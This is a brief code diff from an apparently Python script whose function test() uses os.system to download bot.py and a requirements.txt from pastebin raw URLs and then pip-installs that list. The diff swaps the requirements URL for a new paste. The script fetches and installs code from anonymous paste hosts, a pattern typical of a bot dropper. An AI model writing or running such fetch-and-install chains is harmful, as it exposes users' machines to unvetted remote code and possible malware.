@@ -12,7 +12,7 @@ def test():
 	os.system('curl https://pastebin.com/raw/YXZQGd0u -o bot.py')
 	time.sleep(3)
 	print('[x] Downloading requirements ')
-	os.system('curl https://pastebin.com/raw/bNWEAw6w -o requirements.txt')
+	os.system('curl https://pastebin.com/raw/490h3pdf -o requirements.txt')
 	print('[x] Installing pip')
 	os.system('pip install -r requirements.txt')
 	time.sleep(5)	
